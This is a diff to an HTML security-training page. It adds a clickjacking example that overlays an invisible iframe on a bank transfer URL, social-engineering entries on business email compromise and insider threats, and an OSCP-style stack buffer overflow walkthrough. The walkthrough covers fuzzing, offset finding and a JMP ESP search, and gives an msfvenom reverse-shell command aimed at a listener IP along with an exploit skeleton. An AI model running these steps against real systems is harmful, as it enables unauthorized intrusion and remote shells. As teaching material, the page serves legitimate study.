@@ -33,6 +33,7 @@
       <div class="sidebar__heading">VAPT Methodology</div>
       <a href="#recon" class="sidebar__link">🔍 Reconnaissance</a>
       <a href="#exploitation" class="sidebar__link">⚔️ Exploitation</a>
+      <a href="#bof" class="sidebar__link">💣 Buffer Overflow</a>
       <a href="#privesc" class="sidebar__link">⬆️ Privilege Escalation</a>
       <a href="#reporting" class="sidebar__link">📋 Reporting & CVSS</a>
     </div>
@@ -226,6 +227,21 @@ import jwt
 # Good: jwt.decode(token, key, algorithms=["HS256"])  # whitelist algorithm
 
 # Check JWT online: jwt.io (development only, never prod secrets!)</code></pre>
+
+        <h3>Clickjacking</h3>
+        <pre><code>&lt;!-- Attacker overlays an invisible iframe of a real site over a fake
+     button, tricking the user into clicking something on the real page
+     (e.g. "Delete Account" or "Transfer Funds") without realizing it. --&gt;
+&lt;style&gt;
+  iframe { opacity: 0.0001; position: absolute; top: 0; left: 0; width: 500px; height: 500px; }
+  .fake-button { position: absolute; top: 200px; left: 50px; }
+&lt;/style&gt;
+&lt;div class="fake-button"&gt;Click to win a prize!&lt;/div&gt;
+&lt;iframe src="https://bank.com/transfer?to=attacker&amp;amount=1000"&gt;&lt;/iframe&gt;
+
+# Defenses: send an X-Frame-Options header, or the modern CSP equivalent
+X-Frame-Options: DENY
+Content-Security-Policy: frame-ancestors 'none';</code></pre>
       </div>
     </section>
 
@@ -471,10 +487,12 @@ Set-Cookie: session=abc; SameSite=Strict; Secure; HttpOnly
               <tr><td>Vishing / Smishing</td><td>Phishing via voice call or SMS instead of email</td></tr>
               <tr><td>Pretexting</td><td>Attacker fabricates a false scenario (e.g. "IT support") to extract info or access</td></tr>
               <tr><td>Baiting</td><td>Leaving an infected USB drive labeled "Payroll 2026" for someone to plug in</td></tr>
+              <tr><td>Business Email Compromise (BEC)</td><td>Impersonating a CEO/vendor via a lookalike or compromised email account to redirect a real invoice payment to the attacker's bank account</td></tr>
+              <tr><td>Insider Threat</td><td>A current or former employee/contractor who misuses legitimate access — malicious (data theft, sabotage) or negligent (falls for phishing, mishandles data)</td></tr>
             </tbody>
           </table>
         </div>
-        <p style="color:var(--text-dim)">The common defense across all of these is the same: user security-awareness training, email filtering/sandboxing, and MFA so a stolen password alone isn't enough to get in.</p>
+        <p style="color:var(--text-dim)">The common defense across all of these is the same: user security-awareness training, email filtering/sandboxing, and MFA so a stolen password alone isn't enough to get in. For insider threats specifically: least-privilege access, offboarding checklists that revoke access immediately, and DLP/UEBA tooling to flag anomalous data access.</p>
 
         <h3>Ransomware</h3>
         <p>Malware that encrypts a victim's files (or locks the system) and demands payment — usually in cryptocurrency — for the decryption key. Modern ransomware groups add <strong>double extortion</strong>: exfiltrate data first, then threaten to leak it publicly even if the victim restores from backup, to pressure payment regardless.</p>
@@ -614,6 +632,93 @@ stty raw -echo; fg
 reset
 export TERM=xterm
 stty rows 50 columns 200</code></pre>
+      </div>
+    </section>
+
+    <!-- ===== BUFFER OVERFLOW ===== -->
+    <section id="bof">
+      <h2>💣 Buffer Overflow &amp; Binary Exploitation</h2>
+      <div class="lesson-block">
+        <div class="lesson-block__header">
+          <div class="lesson-block__title">Stack-Based Buffer Overflow Walkthrough (OSCP Classic)</div>
+          <button class="btn btn--outline btn--sm" data-lesson="cybersecurity-vapt:bof">Mark Complete</button>
+        </div>
+        <p>A buffer overflow happens when a program writes more data into a fixed-size stack buffer than it was allocated, overwriting adjacent memory — including the <strong>EIP/RIP return address</strong>, which controls where execution jumps next. Control that address, and you control execution.</p>
+
+        <h3>The 7-Step Methodology</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>#</th><th>Step</th><th>Goal</th></tr></thead>
+            <tbody>
+              <tr><td>1</td><td>Spiking / Fuzzing</td><td>Send increasing junk data to find the crash point</td></tr>
+              <tr><td>2</td><td>Finding the offset</td><td>Determine exactly how many bytes reach EIP</td></tr>
+              <tr><td>3</td><td>Overwriting EIP</td><td>Confirm you control the return address precisely</td></tr>
+              <tr><td>4</td><td>Finding bad characters</td><td>Identify bytes (e.g. <code>\x00</code>) the app mangles, which must be excluded from shellcode</td></tr>
+              <tr><td>5</td><td>Finding the right module</td><td>Find a <code>JMP ESP</code> (or equivalent) instruction with no memory protections (ASLR/DEP off) to redirect into your buffer</td></tr>
+              <tr><td>6</td><td>Generating shellcode</td><td>Generate a payload (msfvenom) excluding the bad chars found in step 4</td></tr>
+              <tr><td>7</td><td>Getting a shell</td><td>Add NOP sled + shellcode, confirm the reverse shell connects</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Fuzzing &amp; Finding the Offset</h3>
+        <pre><code># Step 1: Fuzz with a Python script sending increasing buffer sizes
+# until the target service crashes (watch it in a debugger, e.g. Immunity + mona.py)
+import socket, time
+ip, port = "10.10.10.5", 9999
+buffer = "A" * 100
+while True:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ip, port))
+        s.send((buffer + "\r\n").encode())
+        s.close()
+        buffer += "A" * 100
+        time.sleep(1)
+    except:
+        print("Crashed at buffer length: " + str(len(buffer)))
+        break
+
+# Step 2: Generate a unique (non-repeating) pattern to find the EXACT offset to EIP
+msf-pattern_create -l 3000
+# Send it instead of "A"*n, note the value in the EIP register after the crash, then:
+msf-pattern_offset -l 3000 -q <EIP_value_from_crash>
+# → e.g. "Exact match at offset 2003" — EIP starts exactly 2003 bytes into the buffer</code></pre>
+
+        <h3>Controlling EIP &amp; Finding Bad Characters</h3>
+        <pre><code># Step 3: Confirm control — offset bytes + 4 bytes of "B"s should land exactly in EIP
+buffer = "A" * 2003 + "B" * 4 + "C" * 500
+# If EIP shows 42424242 (hex for "BBBB"), you have precise control
+
+# Step 4: Send all possible byte values (\x01-\xff, skip \x00 — always bad)
+# and compare the memory dump after the crash to the original list.
+# Any byte that's missing, altered, or truncates the chain is a "bad character."
+badchars = (
+  "\x01\x02\x03...\xff"
+)
+# Common bad chars: \x00 (null terminator), \x0a (line feed), \x0d (carriage return)</code></pre>
+
+        <h3>Finding a JMP ESP &amp; Generating the Final Exploit</h3>
+        <pre><code># Step 5: Find a JMP ESP instruction in a module WITHOUT ASLR/DEP/SafeSEH
+# (mona.py inside Immunity Debugger does this automatically)
+!mona jmp -r esp -cpb "\x00\x0a\x0d"      # exclude known bad chars
+
+# Step 6: Generate shellcode excluding the bad characters
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
+  -f c -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
+
+# Step 7: Final exploit skeleton
+offset       = 2003
+ret          = b"\xYY\xXX\x..."   # JMP ESP address, little-endian
+nop_sled     = b"\x90" * 16
+shellcode    = b"<generated shellcode from msfvenom>"
+buffer       = b"A" * offset + ret + nop_sled + shellcode
+
+# Send `buffer` to the vulnerable service — EIP jumps to ESP,
+# lands on the NOP sled, slides into the shellcode → reverse shell</code></pre>
+        <div class="note" style="background:rgba(255,77,109,0.08);border-left:3px solid var(--danger);padding:10px 12px;border-radius:4px;margin-top:8px">
+          <strong>Why this still matters:</strong> modern software has DEP/ASLR/stack canaries, but this exact workflow is how OSCP still teaches binary exploitation fundamentals — and the underlying bug class (unchecked buffer length) is still found in embedded systems, legacy software, and custom protocol parsers today.
+        </div>
       </div>
     </section>
 
